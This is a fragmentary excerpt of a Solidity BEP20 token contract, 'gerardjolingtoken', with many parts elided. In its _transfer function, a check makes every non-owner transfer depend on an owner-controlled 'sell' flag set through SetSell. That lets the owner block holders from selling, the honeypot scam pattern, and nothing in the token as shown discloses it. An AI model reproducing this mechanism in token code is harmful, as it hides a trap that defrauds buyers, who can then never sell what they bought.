...
/**
   #gerardjolingtoken(gerardjolingtoken)
...
contract gerardjolingtoken is Context, IBEP20, Ownable {
    ...
    address private _charityWalletAddress = 0x25B5a4ff9580b94644AfDd320393Bfc9257164fA;
   
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 1250000000 * 10**18;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "gerardjolingtoken";
    string private _symbol = "gerard";
    ...
    uint256 public _maxTxAmount = 1250000000 *  10**18;
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != pancakeswapV2Pair, "BRAIN: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");
    ...
    function SetSell(bool enabled) public onlyOwner {
        sell = enabled;
    }
    ...
    function _transfer(
        ...
        from != owner())
        require(sell == true , "@[email protected]");
